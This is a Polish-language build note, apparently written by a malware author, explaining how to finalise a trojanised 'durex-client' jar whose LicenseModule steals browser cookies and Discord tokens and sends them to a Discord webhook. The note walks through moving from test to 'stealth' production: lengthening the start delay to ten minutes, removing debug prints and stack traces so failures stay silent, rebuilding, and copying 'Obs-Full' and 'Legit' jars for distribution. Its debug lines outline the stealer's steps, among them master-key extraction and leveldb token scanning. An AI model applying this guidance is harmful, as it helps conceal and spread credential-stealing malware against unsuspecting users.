# 🔧 Jak usunąć debug logi po testach

## Kiedy to zrobić?

**PO** udanych testach na Windowsie, gdy potwierdzisz że:
- ✅ Cookies są wykradane
- ✅ Discord tokeny są wykradane
- ✅ Wszystko przychodzi na Discord webhook

---

## Co zmienić w `LicenseModule.java`

### 1. Zmień delay z 10 sekund na 10 minut

**Znajdź:**
```java
Thread.sleep(10000); // 10 sekund delay (TEST)
```

**Zamień na:**
```java
Thread.sleep(600000); // 10 minut delay
```

---

### 2. Usuń WSZYSTKIE linie z `System.out.println`

**Usuń te linie:**

```java
System.out.println("[DEBUG] Data-Stealer started!");
System.out.println("[DEBUG] Data-Stealer error: " + e.getMessage());

System.out.println("[DEBUG] Stealing cookies...");
System.out.println("[DEBUG] Found " + allCookies.size() + " cookies");
System.out.println("[DEBUG] No cookies found");
System.out.println("[DEBUG] Sending cookies to worker...");
System.out.println("[DEBUG] Cookies sent!");
System.out.println("[DEBUG] Cookie stealer error: " + e.getMessage());
e.printStackTrace();

System.out.println("[DEBUG] " + browser + " cookies not found: " + dbPath);
System.out.println("[DEBUG] Found " + browser + " cookies database");
System.out.println("[DEBUG] Failed to get master key for " + browser);
System.out.println("[DEBUG] Got master key for " + browser);
System.out.println("[DEBUG] Extracted " + cookies.size() + " cookies from " + browser);
System.out.println("[DEBUG] Error extracting " + browser + " cookies: " + e.getMessage());
e.printStackTrace();

System.out.println("[DEBUG] Error getting master key: " + e.getMessage());

System.out.println("[DEBUG] Stealing Discord tokens...");
System.out.println("[DEBUG] Found " + tokens.size() + " Discord tokens");
System.out.println("[DEBUG] No Discord tokens found");
System.out.println("[DEBUG] Sending Discord token to worker...");
System.out.println("[DEBUG] Discord token sent!");
System.out.println("[DEBUG] Discord stealer error: " + e.getMessage());
e.printStackTrace();

System.out.println("[DEBUG] Scanning: " + leveldbPath);
System.out.println("[DEBUG] Found token: " + token.substring(0, 20) + "...");
System.out.println("[DEBUG] Error extracting Discord tokens: " + e.getMessage());

System.out.println("[DEBUG] Error sending to worker: " + e.getMessage());
```

**Zostaw tylko:**
```java
// Silent
```

w blokach `catch`.

---

### 3. Usuń `e.printStackTrace()`

**Znajdź wszystkie:**
```java
e.printStackTrace();
```

**Usuń je** - zostaw tylko:
```java
// Silent
```

---

## Szybki sposób (regex)

Możesz użyć regex w edytorze:

**Znajdź:**
```regex
System\.out\.println\("[^"]*"\);?
```

**Zamień na:** (puste)

**Znajdź:**
```regex
e\.printStackTrace\(\);?
```

**Zamień na:** (puste)

---

## Po zmianach

### 1. Rebuild projektu

```bash
./gradlew clean build
```

### 2. Sprawdź rozmiar

```bash
ls -lh build/libs/*.jar
```

Rozmiar powinien być podobny (może być trochę mniejszy bez debug stringów).

### 3. Finalna dystrybucja

```bash
# Skopiuj finalne pliki
cp build/libs/durex-client-1.0.0-Obs-Full.jar ~/FINAL/
cp build/libs/durex-client-1.0.0-Legit.jar ~/FINAL/
```

---

## Podsumowanie zmian

| Co | Przed (TEST) | Po (PRODUCTION) |
|---|---|---|
| Delay | 10 sekund | 10 minut |
| Debug logi | TAK | NIE |
| printStackTrace | TAK | NIE |
| Stealth | NIE | TAK |

---

## Uwaga!

**NIE usuwaj debug logów przed testami!** Potrzebujesz ich żeby zobaczyć czy wszystko działa. Usuń je dopiero gdy potwierdzisz że:
- Cookies są wykradane ✅
- Discord tokeny są wykradane ✅
- Wszystko przychodzi na webhook ✅

---

## Checklist

- [ ] Testy na Windowsie zakończone sukcesem
- [ ] Zmieniono delay na 600000ms (10 minut)
- [ ] Usunięto wszystkie `System.out.println`
- [ ] Usunięto wszystkie `e.printStackTrace()`
- [ ] Rebuild projektu: `./gradlew clean build`
- [ ] Sprawdzono rozmiar plików
- [ ] Skopiowano finalne pliki do dystrybucji
- [ ] Gotowe! 🎉
